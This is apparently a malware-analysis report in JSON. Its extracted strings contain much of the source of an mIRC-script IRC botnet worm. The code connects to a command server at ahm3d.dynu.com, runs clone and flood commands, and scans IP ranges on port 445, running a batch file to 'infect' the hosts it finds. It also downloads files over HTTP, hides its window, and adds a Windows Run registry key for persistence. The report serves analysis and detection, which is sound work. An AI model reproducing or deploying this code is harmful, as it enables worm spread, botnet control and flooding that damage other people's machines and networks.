            "on *:join:%cc:{ if ($nick = $me) { timerjc off } }",
            "on *:sockread:BncServer*:{",
            "  sockread %BncServer",
            "  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer",
            "on *:sockread:Ntimer*:{",
            "  sockread %ntread",
            "  Stay %ntread",
            "on *:sockread:Clone*:{",
            "  sockread %QHTread",
            "  Stay %QHTread",
            "alias fnick {",
            "  set %fnick $rand(1,10)",
            "  if (%fnick = 1) { return $read reader.w $+ $chr($r(65,125)) $+ $chr($r(65,125))  }",
            "  if (%fnick = 2) { return $chr($r(65,125)) $+ $read reader.w $+ $chr($r(65,125))  }",
            "  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  reader.w }",
            "  if (%fnick = 4) { return $r(A,Z) $+ $read reader.w $+ $r(A,Z) }",
            "  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }",
            "  if (%fnick = 6) { return $read  reader.w $+ $r(1,40) $+ $chr($r(65,125))  }",
            "  if (%fnick = 7) { return $r(a,z) $+ $read reader.w $+ $r(a,z) }",
            "  if (%fnick = 8) { return $read  reader.w $+ $r(a,z) $+ $chr($r(65,125))  }",
            "  if (%fnick = 9) { return $read  reader.w $+ $r(1,10) $+ $chr($r(65,125))  }",
            "  if (%fnick = 10) { return $read  reader.w $+ $r(20,50) $+ $chr($r(65,125)) }",
            "alias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c ",
            "inviter",
            "14: ",
            "1Error",
            "1 Please set delay:",
            " !inviter delay ",
            "delay",
            " | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c ",
            "inviter",
            "14: ",
            "1Error Starting Inviter, Inviter Server or Port not set! ",
            "%iserver",
            "%iserver.port",
            " | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c ",
            "inviter",
            "14: ",
            "1Error: Inviter already loaded! | halt }  ",
            "//sockopen inviterN %i.server %i.port  | msg %s.i.c ",
            "14inviter",
            "14: ",
            "1Loading inviter to Server",
            "14: ",
            "14 $+ $+ %i.server $+ ",
            "1Port: ",
            "14 $+ %i.port $+ ",
            ") |  //sockopen inviterM %i.server %i.port  }",
            "alias Cona { server ahm3d.dynu.com 6667 | set %cc #B4n |  if ($portfree(113)) { socklisten IDENT 113 } }",
            "on *:sockread:inviter*:{   sockread -f %t.i  | if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msg %s.i.c ",
            "inviter",
            "1 Listing channels on (",
            "14 $+ $remove($gettok(%t.i,1,32),:) $+ ",
            " }  |  if ($gettok(%t.i,2,32) == 323) { msg %s.i.c ",
            "inviter",
            "14: ",
            "1Listing channels complete on",
            " $remove($gettok(%t.i,1,32),:) ",
            "1Total Channels in List",
            " $+ $lines(ichan.txt) $+ ",
            " }  ",
            "  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c ",
            "inviter",
            "1 Join Error",
            "1 Banned from (",
            "14 $+ $gettok(%t.i,4,32) $+ ",
            "1) } |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } | if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == Off) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } ",
            "  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on Off |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on Yes  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } ",
            "  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c ",
            "inviter",
            "1 Error Connecting",
            "14: %t.i ",
            "14attempting to reconnect",
            "1)-(",
            "14to stop !inviter stop",
            "1) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } ",
            "  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1  | /msg %s.i.c ",
            "inviter",
            "1] Error: not inviting:[",
            " $+ $gettok(%t.i,5,32) $+ ",
            "1]  because he was Oped!",
            " } | if ($gettok(%t.i,4,32) == +v) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1 } }",
            "  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j  } | if ($gettok(%t.i,2,32) == 313) { /msg %s.i.c ",
            "14inviter",
            "1] WARNING: ",
            "14IRCOP Detected ",
            " $+ $gettok(%t.i,4,32) $+ ",
            "  if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  }  ",
            "on 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read reader.w $+ $r(a,z) $+ $r(1,60) a a : [ [ $fnick ] ] |  sockwrite -tn $sockname Nick $read reader.w | /timerinviteconnect off | sockread  }",
            "on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msg %s.i.c ",
            "inviter",
            "1 Inviter was disconnected! ",
            "4Reloading.",
            " | /sockopen $sockname %i.server %i.port } }",
            "on *:Sockopen:NTimer*:{",
            "  if ($sockerr > 0) { halt }",
            "  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)",
            "  .sockwrite -nt $sockname USER %user %user %user : $+ %user",
            "  .sockwrite -nt $sockname NICK $fnick",
            "  timernick 0 2 sockwrite -nt NTimer* Nick %ntnick",
            "alias clone {",
            "  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }",
            "  if ($1 = join) { sockwrite -nt Clone* Join $2- }",
            "  if ($1 = part) { sockwrite -nt Clone* Part $2 : $+ $3- }",
            "  if ($1 = msg) { sockwrite -nt Clone* privmsg $2 : $+ $3- }",
            "  if ($1 = notice) { sockwrite -nt Clone* notice $2 : $+ $3- }",
            "  if ($1 = reg) { sockwrite -nt Clone* Privmsg NickServ : $+ register $2- | sockwrite -nt Clone* Privmsg NickServ : $+ identify $2- }",
            "  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt Clone* Join %rchan | sockwrite -nt Clone* Privmsg Chanserv : register %rchan $fnick Clone }",
            "  if ($1 = jp) { sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- | sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- | sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- }",
            "  if ($1 = jmp) { sockwrite -nt Clone* Join $2 | sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* part $2 }",
            "  if ($1 = flood.c) { sockwrite -nt Clone* join $2 | sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* notice $2 : $3- | sockwrite -nt Clone* privmsg $2 : $3- }",
            "  if ($1 = flood.n) { sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* notice $2 : $3- | sockwrite -nt Clone* privmsg $2 : $3- }",
            "  if ($1 = chat.flood) { sockwrite -nt Clone* privmsg $2 :",
            "DCC CHAT $2 1058633484 3481",
            "  if ($1 = Quit) { Sockwrite -nt Clone* Quit : $+ $2- }",
            "  if ($1 = massquit) { SockWrite -nt Clone* Join $2 | Sockwrite -nt Clone* Quit : $+ $3- }",
            "  if ($1 = fnick) { sockwrite -nt Clone* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }",
            "  if ($1 = Die) { timeropensock* off | sockclose Clone* }",
            "alias opensock { sockopen Clone $+ $fnick %cserver %cport }",
            "alias Stay {",
            "  if (PING = $1) { sockwrite -nt * $1- }",
            "on *:Sockopen:Clone*:{",
            "  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)",
            "  .sockwrite -nt $sockname USER %user %user %user : $+ %user",
            "  .sockwrite -nt $sockname NICK $fnick",
            "raw 433:*:{",
            " nick [ $+ $os $+ - $+ $r(1000,9999) $+ ]] ",
            "alias apages { set %asite $1 | set %filesite $2 | sockopen apages $+ $fnick %asite 80 }",
            "alias apagestop { timerapage* off | sockclose apages* }",
            "on *:sockopen:apages*:{",
            "  timerapage $+ $fnick 0 2 sockwrite -nt apages* GET %filesite",
            "on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }",
            "on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }",
            "alias startscan {",
            "  inc %totalscaning",
            "  if %totalscaning == %total finished",
            "  set %ip1 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 1",
            "  set %ip2 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 2",
            "  set %ip3 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 3",
            "  set %ip4 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 4",
            "  set %ip5 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 5",
            "  set %ip6 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 6",
            "  set %ip7 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 7",
            "  set %ip8 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 8",
            "  set %ip9 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 9",
            "  set %ip10 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 10",
            "  set %ip11 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 11",
            "  set %ip12 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 12",
            "  set %ip13 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 13",
            "  set %ip14 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 14",
            "  set %ip15 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 15",
            "  set %ip16 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 16",
            "  set %ip17 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 17",
            "  set %ip18 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 18",
            "  set %ip19 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 19",
            "  set %ip20 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 20",
            "  set %ip21 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 21",
            "  set %ip22 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 22",
            "  set %ip23 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 23",
            "  set %ip24 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  if %totalscaning == %total opensocks 24",
            "  set %ip25 $longip($calc( %beglongip + %totalscaning ))",
            "  inc %totalscaning",
            "  opensocks",
            "alias opensocks {",
            "  sockopen ip1 %ip1 445",
            "  if $1 == 1 finished",
            "  sockopen ip2 %ip2 445",
            "  if $1 == 2 finished",
            "  sockopen ip3 %ip3 445",
            "  if $1 == 3 finished",
            "  sockopen ip4 %ip4 445",
            "  if $1 == 4 finished",
            "  sockopen ip5 %ip5 445",
            "  if $1 == 5 finished",
            "  sockopen ip6 %ip6 445",
            "  if $1 == 6 finished",
            "  sockopen ip7 %ip7 445",
            "  if $1 == 7 finished",
            "  sockopen ip8 %ip8 445",
            "  if $1 == 8 finished",
            "  sockopen ip9 %ip9 445",
            "  if $1 == 9 finished",
            "  sockopen ip10 %ip10 445",
            "  if $1 == 10 finished",
            "  sockopen ip11 %ip11 445",
            "  if $1 == 11 finished",
            "  sockopen ip12 %ip12 445",
            "  if $1 == 12 finished",
            "  sockopen ip13 %ip13 445",
            "  if $1 == 13 finished",
            "  sockopen ip14 %ip14 445",
            "  if $1 == 14 finished",
            "  sockopen ip15 %ip15 445",
            "  if $1 == 15 finished",
            "  sockopen ip16 %ip16 445",
            "  if $1 == 16 finished",
            "  sockopen ip17 %ip17 445",
            "  if $1 == 17 finished",
            "  sockopen ip18 %ip18 445",
            "  if $1 == 18 finished",
            "  sockopen ip19 %ip19 445",
            "  if $1 == 19 finished",
            "  sockopen ip20 %ip20 445",
            "  if $1 == 20 finished",
            "  sockopen ip21 %ip21 445",
            "  if $1 == 21 finished",
            "  sockopen ip22 %ip22 445",
            "  if $1 == 22 finished",
            "  sockopen ip23 %ip23 445",
            "  if $1 == 23 finished",
            "  sockopen ip24 %ip24 445",
            "  if $1 == 24 finished",
            "  sockopen ip25 %ip25 445",
            "  timerscannerTE 1 12 sockclose ip*",
            "  timerscannerSA 1 15 startscan",
            "alias randip {",
            "  unset %1p1 %1p2",
            "  set %1p1 $1-",
            "  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))",
            "  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))",
            "  return %1p2",
            "on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run pnp11.exe /n /fh /r \"vlxd.bat   %445 $+ \" | msg %cc ",
            "scanner",
            " Found: %445 $+ , attempting to infect.. | sockclose $sockname | unset %445 | halt }",
            "alias download {",
            "  var %socket $+(dl,$chr(46),$nopath($2))",
            "  if (!$sock(%socket)) {",
            "    sockopen %socket $1 80",
            "    sockmark %socket HEAD $1 $2",
            "  else { echo $color(info) -s * Socket already in use. }",
            "alias downd {",
            "  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {",
            "    var %socket $+(dl,$chr(46),$nopath($2))",
            "    if (!$sock(%socket)) {",
            "      sockopen %socket $1 80",
            "      sockmark %socket HEAD $1 $2",
            "    }",
            "    else { echo $color(info) -s * Socket already in use. }",
            "alias percent return $+($round($calc((100 / $2) * $1),2),%)",
            "on *:SOCKOPEN:dl.*:{",
            "  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }",
            "  hadd -m ticks $sockname $ticks",
            "  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(\",$mircdir,%file,\"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)",
            "  write -c %fullfile",
            "  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0",
            "  %sckr HOST: $gettok($sock($sockname).mark,2,32)",
            "  %sckr ACCEPT: *.*",
            "  %sckr $crlf",
            "on *:SOCKREAD:dl.*:{",
            "  if ($sockerr) {",
            "    echo $color(info) -s * Error: $sock($sockname).wsmsg",
            "    return",
            "  var %a",
            "  :begin",
            "  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }",
            "  else { sockread &b }",
            "  if ($sockbr) {",
            "    tokenize 32 $sock($sockname).mark",
            "    if ($1 == HEAD) {",
            "      if (%a) {",
            "        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }",
            "      }",
            "      else {",
            "        sockmark $sockname GET $2- %totsize",
            "      }",
            "    }",
            "    elseif ($1 == GET) {",
            "      var %file = $+(\",$mircdir,$nopath($3),\"), %cursize = $file(%file).size",
            "      var %totsize = $gettok($sock($sockname).mark,4,32)",
            "      bwrite %file -1 &b",
            "    }",
            "    goto begin",
            "on *:SOCKCLOSE:dl.*:{",
            "  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)",
            "  /msg %cc * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.",
            "alias H1dd3 { if ($appstate != hidden) { /exit } }",
            "alias s33 { if ($appactive = $true) { /exit } }",
            "on *:connect:{ .ial on | .timerjc 0 $rand(5,10) /jc |   .timercheck off | .pdcc on | .fsend on | clearall }",
            "alias vlxd32 { %x = $+($r(a,z),$r(1,99),.reg) | write %x REGEDIT4 | write %x [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] | write %x $+(\"Win,$os,Service\"=\",$replace($mircdir,\\,\\\\),$nopath(Tskdbg.exe),\") | .run -n regedit /s %x } }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": []
    },
    "time": "0:00:00.523364",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
